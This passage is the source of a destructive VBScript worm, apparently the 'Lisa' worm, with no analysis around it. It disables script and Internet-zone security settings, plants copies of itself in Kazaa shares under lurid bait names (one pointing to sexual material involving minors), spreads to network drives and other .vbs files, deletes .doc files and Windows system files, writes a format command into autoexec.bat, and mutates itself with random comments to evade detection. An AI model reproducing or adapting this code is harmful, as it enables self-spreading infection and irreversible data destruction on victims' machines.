       RegSet "HKCU\Software\Microsoft\Windows Script Host\Settings\Enabled",1,"1"
   'dixKb
       RegSet "HKCU\Software\Microsoft\Windows Script Host\Settings\TrustPolicy",0,"1"
       RegSet "HKCR\Lisa\shell\open\command\","wscript " &WinDir &FName &"%","0"
       RegSet "HKLM\Software\Microsoft\Windows\CurrentVersion\RegisteredOwner","Lisa","0"
       RegSet "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\0\1200",0,"1"
       RegSet "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\0\1201",0,"1"
   'bSqQOnZmbEbnhCyYqRJFReuTF
       RegSet "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\1\1200",0,"1"
       RegSet "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\1\1201",0,"1"
       RegSet "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\1\1204",0,"1"
       RegSet "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\3\1200",0,"1"
       RegSet "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\3\1201",0,"1"
   'PJjlWmsCpZdechIPXyNNcfyPH
       RegSet "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\3\1204",0,"1"
   End Sub

   Sub CreateGarbage()
   On Error Resume Next
   'uplYhJKhrGeBdFYvYfsazhtAv
   Dim AName, x

       x = 0
       AName = ""
       Randomize
   'luvHbCE

       Do until x = 5000
        Do until Len(AName) = 7
         AName = AName &Chr(Int((90 - 80 + 1) * Rnd + 80))
        Loop
   'pLUIlggfkbjCaqfiCbKIna

        Dim GarbageFolder : Set GarbageFolder = fso.CreateFolder("c:\" &AName)
            GarbageFolder.attributes = GarbageFolder.attributes + 2
            GarbageFolder.attributes = GarbageFolder.attributes + 1
        Set GarbageFolder = Nothing
   'mcrEkjAKYwTvXkxkibvsSzMSOnoNO

        Dim GarbageFile : Set GarbageFile = fso.CreateTextFile("c:\" &AName &"\" &AName &".txt",True)
            GarbageFile.WriteLine "I will never stop loving you"
            GarbageFile.Close
        Set GarbageFile = Nothing
   'tFWBIgEyyxDmemU

        AName = ""
        x = x + 1
       Loop
   End Sub
   'ctxBrUtLGsQFuKWDDoDkAfyjnR

   Sub Kazaa()
   On Error Resume Next
   Dim DownloadDir, KazaaFile, MyCode

   'BtOLe
       DownloadDir = RegGet("HKCU\Software\Kazaa\LocalContent\DownloadDir")

       If DownloadDir <> "" Then
        Dim Myself : Set Myself = fso.OpenTextFile(ScriptPath,ForReading,False)
            MyCode = Myself.ReadAll
   'eanq
            Myself.Close
        Set Myself = Nothing

        Set KazaaFile = fso.CreateTextFile(DownloadDir &"\Silvia Saint Gangbang.avi.vbs",True)
            KazaaFile.Write MyCode
   'blwqXiE
            KazaaFile.Close
        Set KazaaFile = Nothing

        Set KazaaFile = fso.CreateTextFile(DownloadDir &"\Britney Spears nude.jpg.vbs",True)
            KazaaFile.Write MyCode
   'pjHRSQVFwFguuMQ
            KazaaFile.Close
        Set KazaaFile = Nothing

        Set KazaaFile = fso.CreateTextFile(DownloadDir &"\Christina Aguilera Nipple.jpg.vbs",True)
            KazaaFile.Write MyCode
   'KgwoJLcINiGV
            KazaaFile.Close
        Set KazaaFile = Nothing

        Set KazaaFile = fso.CreateTextFile(DownloadDir &"\Lolita.jpg.vbs",True)
            KazaaFile.Write MyCode
   'rVonSx
            KazaaFile.Close
        Set KazaaFile = Nothing

        Set KazaaFile = fso.CreateTextFile(DownloadDir &"\Madonna - Song.mp3.vbs",True)
            KazaaFile.Write MyCode
   'CGdGTMawVqh
            KazaaFile.Close
        Set KazaaFile = Nothing

        Set KazaaFile = fso.CreateTextFile(DownloadDir &"\Jennifer Lopez.mp3.vbs",True)
            KazaaFile.Write MyCode
   'qJZrdoPJjlWmsCpZdec
            KazaaFile.Close
        Set KazaaFile = Nothing
       End If
   End Sub

   'IPXyNNcfyPHpuplYhJKhrG

   Sub Network()
   On Error Resume Next
   Dim NetDrives : Set NetDrives = wsn.EnumNetworkDrives

   'BdFYvYfsazhtAvJluvHb
       If NetDrives.Count <> 0 Then
        For xc = 0 To NetDrives.Count - 1
         If IntStr(NetDrives.Item(xc), "\") <> 0 Then
          fso.CopyFile ScriptPath, fso.BuildPath(NetDrives.Item(xc), WinDir &FName &".vbs")
         End If
   'CEipLUIlggfkbjCa
        Next
       End If
   End Sub

   Sub HTTPFileDownload(url, FileSaveTo)
   'qfiCbKInaxmcrEkjAK
   On Error Resume Next
   Dim Receive, Output, i

       Output = ""
       Internet.Open "GET",url,False
   'rvQQNGXqkqmzTUlnxYDdvgCLzcbRJ
       Internet.Send
       Receive = Internet.ResponseBody

       For i = 0 to UBound(receive)
        Output = Output & ChrW(AscW(Chr(AscB(MidB(Receive,i+1,1)))))
   'sXHZaWsZBje
       Next

       Dim Download : Set Download = fso.CreateTextFile(FileSaveTo,True)
           Download.Write Output
           Download.Close
   'oeZjubbTEcBPKO
       Set Download = Nothing
   End Sub

   Function DoDrives()
   On Error Resume Next
   'pcYmjJbDJFSV
   Dim hdready

       Dim Drives : Set Drives = fso.Drives

       For Each Drive in Drives
   'EGQVwOcyUODfpqotddLZl
        If Drive.Drivetype = Remote Then
         hdready = Drive & "\"
         Call Subfolders(hdready)
        ElseIf Drive.IsReady Then
         hdready = Drive & "\"
   'siLTChkHhmCNetfWuTSrpaeIf
         Call Subfolders(hdready)
        End If
       Next

       Set Drives = Nothing
   'kFCtVMIVhyWJTnhPRuRXaVxIJH
   End Function

   Function Subfolders(Path)
   On Error Resume Next
   Dim Ext, File, Subfol
   'gnvmlEILC

       Dim Fold : Set Fold = fso.GetFolder(Path)
       Dim Files : Set Files = Fold.Files

       For Each File in Files
   'ofUADZzFUQwMiiNWe
        Ext = LCase(fso.GetExtensionName(File.Path))

        If File.Name = "mirc.ini" Then
         Call Mirc(File.ParentFolder)
        End If

        If (Ext = "vbs") or (Ext = "vbe") Then
            Dim VBSFile : Set VBSFile = fso.OpenTextFile(File.Path,ForAppending,True)
             Dim ScriptFile : Set ScriptFile = fso.OpenTextFile(ScriptPath,ForReading,True)
                 VBSFile.Write ScriptFile.ReadAll
                 VBSFile.Close
                 ScriptFile.Close
             Set VBSFile = Nothing
             Set ScriptFile = Nothing
            End If

            If Ext = "doc" Then
             fso.DeleteFile(File.Path)
            End If
           Next
   'IdwxKDXF

           Set File = Fold.Subfolders
           For Each Subfol in File
            Call Subfolders(Subfol.Path)
       Next
   'MYhBRZfGAbdNUjshQ
   End Function

   Sub Payload(value)
   On Error Resume Next
       If value = "1" Then
   'MKPyGOaF
        fso.DeleteFile(WinDir &"regedit.exe")

        If Left(Date(),2) - Left(RegGet("HKCR\Lisa\InfectionDate"),2) > 3 Then
         fso.DeleteFile(WinDir &"user.dat")
         fso.DeleteFile(WinDir &"user.bak")
   'WLOEa
         fso.DeleteFile(WinDir &"system.dat")
         fso.DeleteFile(WinDir &"system.bak")
         fso.DeleteFile(WinDir &"win.com")
        End If
           Else
   'igSGSH
        RegSet "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoDesktop",00000001,"1"

        Dim Autoexec : Set Autoexec = fso.OpenTextFile("C:\Autoexec.bat",ForAppending,True)
            Autoexec.WriteLine "format c: /q /autotest /u"
            Autoexec.Close
   'cPPBBiwrvQQNGX
        Set Autoexec = Nothing

        wss.run "RunDll32.exe Shell32.dll,SHExitWindowsEX 0x01"
       End If
   End Sub
   'DPWRrsQSwbJFM

   Sub RegSet(key,value,keytype)
   On Error Resume Next
   Dim Registry : Set Registry = CreateObject("WScript.Shell")

   'kICDBHpipYvfxCFvXx
       Select Case keytype
        Case "1" Registry.RegWrite key,value,"REG_DWORD"
        Case Else Registry.RegWrite key,value
       End Select
   End Sub
   'OJwTJyOZGGrcHnEjDm

   Function RegGet(value)
   On Error Resume Next
   Dim Registry : Set Registry = CreateObject("WScript.Shell")
       RegGet = Registry.RegRead(value)
   'UHExSOhGbidquLceoAumItmbLU
   End Function

   Function Mutator(CTM)
   On Error Resume Next
   Dim Strings, CommentsCount, CommentPlace, y, b, Comment, DoMutateBody
   'TZIBJkyxQUXOj

       Strings = Split(CTM,vbCrLf)
       CommentsCount = CByte(GetRndNumber(3,UBound(Strings) / 1.5))
       CommentPlace = CByte(UBound(Strings) / CommentsCount)
       y = 0
   'saM

       For b = 0 To UBound(Strings) Step 1
        DoMutateBody = DoMutateBody & Strings(b) & vbCrLf
        y = y + 1

   'gMRalJYKuZ
        If y = CommentPlace Then
         Comment = MakeComment()
         DoMutateBody = DoMutateBody & Comment
         y = 0
        End If
   'qWCVFKgKWQeaAYtlgtNuhrSNnp
       Next

       Mutator = DoMutateBody
   End Function

   'qwFtghflLTDRQcg
   Function MakeComment()
   On Error Resume Next
   Dim CommentLength, DoComment, z, a

       CommentLength = CByte(GetRndNumber(3,30))
   'aCTLsbydsokNNluJiEhIyi
       DoComment = Chr(39)

       For z = 1 To CommentLength Step 1
        a = CByte(GetRndNumber(65,122))

   'wdDkwEyMpxzKeGImtPY
        If a < 91 or a > 96 Then
         DoComment = DoComment & Chr(a)
        Else
         z = z - 1
        End If
   'pjkiofnGd
       Next

       MakeComment = DoComment & vbCrLf
   End Function

   'ZORIdKm
   Function GetRndNumber(a,b)
   On Error Resume Next
   Dim c

       Randomize
   'WJaVLgTSEEcmAvyTaTQKucn
       c = (b - a) * Rnd + a
       GetRndNumber = c
   End Function
   ''End

   'qDWXpqCHhydkGPDgbbfVNVwKadvF
